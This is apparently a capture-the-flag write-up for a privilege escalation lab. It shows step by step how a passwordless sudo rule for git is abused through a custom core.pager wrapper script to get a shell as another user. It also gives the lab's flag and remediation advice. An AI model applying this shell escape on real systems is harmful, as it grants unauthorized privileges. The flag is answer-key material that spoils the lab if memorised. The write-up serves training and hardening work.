# Privilege Escalation Lab 1 — Writeup

**Category:** Privilege Escalation
**Difficulty:** Medium
**Target:** `172.31.45.248:30531`
**Initial access:** SSH with provided ECDSA key as user `user`

## Flag

```
ctf{esc4l4t!ng_pr!v!l3g3s}
```

## Summary

The box requires a single privilege escalation hop, from the low-privileged
user `user` to `ctf`, where the flag is stored at `/home/ctf/flag`. The
vector is a sudo misconfiguration combined with a classic GTFOBins-style
pager escape in `git`.

## Steps

### 1. Initial enumeration

Connected over SSH using the provided key:

```bash
chmod 600 id_ecdsa
ssh -i id_ecdsa user@172.31.45.248 -p 30531
```

Checked current privileges:

```bash
id
# uid=1000(user) gid=1000(user) groups=1000(user)

sudo -l
```

`sudo -l` revealed:

```
User user may run the following commands on <host>:
    (ctf : ctf) NOPASSWD: /usr/bin/git
```

This means `user` can run `/usr/bin/git` as the `ctf` user, with no
password required.

### 2. Identifying the escalation vector

`git` is a well-known [GTFOBins](https://gtfobins.github.io/gtfobins/git/)
binary: several subcommands (`log`, `diff`, `branch --help`, etc.) invoke a
pager, and the pager command can be overridden via `-c core.pager=<cmd>`.
If the pager is set to a shell, git spawns that shell inheriting git's own
privileges — in this case, `ctf`.

The target system is "minimized" (no `man-db`, no interactive `less`), so
the naive approach (`git -p help` → `!/bin/sh` inside `less`) did not work,
since `help` tries to invoke `man`, which isn't installed, and no pager is
ever launched.

### 3. Exploiting it

A plain `-c core.pager=sh` also failed, because the pager process receives
the git output on its *stdin*, and plain `sh` tried to interpret that
output as shell commands (causing syntax errors).

The fix: use a small wrapper script that re-attaches the pager's stdin to
the terminal (stdout) before exec'ing a shell, so it ignores the piped
git output and gives an interactive shell instead:

```bash
cat > /tmp/pager.sh << 'EOF'
#!/bin/sh
exec sh 0<&1
EOF
chmod +x /tmp/pager.sh
```

An empty git repo with at least one commit is needed so `git log` actually
invokes the pager:

```bash
mkdir -p /tmp/x && cd /tmp/x
git init
git config user.email "a@a.com"
git config user.name "a"
git commit --allow-empty -m "init"
chmod -R 777 /tmp/x   # ensure ctf can read/access the repo
```

Then trigger the escalation:

```bash
sudo -u ctf git -C /tmp/x -c core.pager=/tmp/pager.sh log
```

This drops into an interactive shell running as `ctf`:

```bash
id
# uid=1001(ctf) gid=1001(ctf) groups=1001(ctf)
```

### 4. Capturing the flag

```bash
cat /home/ctf/flag
# ctf{esc4l4t!ng_pr!v!l3g3s}
```

## Root cause

- A `sudo` rule allowed `user` to run `/usr/bin/git` as `ctf` with no
  password and no argument restrictions.
- `git`'s pager mechanism can be repointed at an arbitrary executable via
  `-c core.pager=...`, which git then spawns with the privileges of the
  user it's running as (here, `ctf`).

## Remediation

- Avoid granting `sudo` access to binaries with known GTFOBins shell-escape
  behavior (`git`, `less`, `vim`, `find`, `awk`, etc.) unless the command
  is tightly restricted (e.g. specific subcommands/arguments only, or via
  a wrapper script with a fixed argument list).
- If `git` access via sudo is required, restrict it with `NOEXEC` and/or
  a `sudoers` command alias that whitelists safe subcommands only.
- Regularly audit `sudo -l` output as part of hardening reviews.
